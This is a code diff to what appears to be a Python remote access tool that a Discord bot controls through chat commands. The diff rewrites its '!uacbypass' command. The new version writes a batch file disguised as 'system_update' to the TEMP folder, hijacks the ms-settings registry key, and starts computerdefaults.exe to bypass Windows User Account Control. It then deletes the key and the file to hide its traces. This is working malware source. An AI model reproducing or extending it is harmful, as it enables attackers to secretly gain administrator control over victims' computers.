@@ -15,6 +15,7 @@ import discord
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
+###placeholder so if token input fails we dont get fucked up (its hard to explain)
 from ctypes import *
 from discord import utils
 import requests
@@ -585,70 +586,42 @@ async def on_message(message):
                 await message.channel.send("[!] Not running with administrator privileges")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
-
     if message.content == "!uacbypass":
         try:
-            import os
-            import win32net
-            
-            server = os.environ.get('logonserver', '')[2:] if 'logonserver' in os.environ else None
-            
-            def if_user_is_admin(server):
+            def is_admin():
                 try:
-                    groups = win32net.NetUserGetLocalGroups(server, os.getlogin())
-                    return any(group.lower().startswith('admin') for group in groups), groups
+                    return ctypes.windll.shell32.IsUserAnAdmin()
                 except:
-                    return False, []
-                    
-            is_admin, groups = if_user_is_admin(server)
+                    return False
             
-            if is_admin:
-                import sys
-                import winreg
-                
-                cmd_exe = "C:\\Windows\\System32\\cmd.exe"
-                helper_exe = 'C:\\Windows\\System32\\fodhelper.exe'
-                start_cmd = "start"
-                registry_path = 'Software\\Classes\\ms-settings\\shell\\open\\command'
-                delegate_key = 'DelegateExecute'
-                
-                def modify_registry(key, value):
-                    try:
-                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
-                        reg_key = winreg.OpenKey(
-                            winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
-                        winreg.SetValueEx(reg_key, key, 0,
-                                          winreg.REG_SZ, value)
-                        winreg.CloseKey(reg_key)
-                        return True
-                    except Exception:
-                        return False
-                
-                if not ctypes.windll.shell32.IsUserAnAdmin():
-                    await message.channel.send("[*] Attempting privilege escalation...")
-                    try:
-                        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
-                        current_script = sys.argv[0]
-                        
-                        if not os.path.isabs(current_script):
-                            current_script = os.path.join(current_dir, current_script)
-                            
-                        cmd = f'{cmd_exe} /k {start_cmd} "{current_script}"'
-                        
-                        if modify_registry(delegate_key, '') and modify_registry(None, cmd):
-                            subprocess.Popen(helper_exe, shell=True, stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE)
-                            await message.channel.send("[*] Privilege escalation initiated")
-                        else:
-                            await message.channel.send("[!] Registry modification failed")
-                    except Exception as e:
-                        await message.channel.send("[!] Operation failed")
-                else:
-                    await message.channel.send("[*] Already running with elevated privileges")
+            if is_admin():
+                await message.channel.send("[*] Already running with administrator privileges")
             else:
-                await message.channel.send("[!] Current user lacks required group membership")
-        except Exception as e:
-            await message.channel.send("[!] Operation could not be completed")
+                temp_dir = os.environ.get('TEMP')
+                payload_path = os.path.join(temp_dir, "system_update")
+                
+                with open(payload_path + ".bat", "w") as f:
+                    current_script = os.path.abspath(sys.argv[0])
+                    f.write(f'@echo off\npowershell -Command "Start-Process \'{sys.executable}\' -ArgumentList \'{current_script}\' -Verb RunAs"')
+                
+                key_path = r"Software\Classes\ms-settings\shell\open\command"
+                try:
+                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'cmd.exe /c "{payload_path}.bat"')
+                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                    winreg.CloseKey(key)
+                    
+                    os.system("start computerdefaults.exe")
+                    time.sleep(3)
+                    
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                    os.remove(payload_path + ".bat")
+                    
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
     if message.content.startswith("!sing"):
         try:
             volumeup()
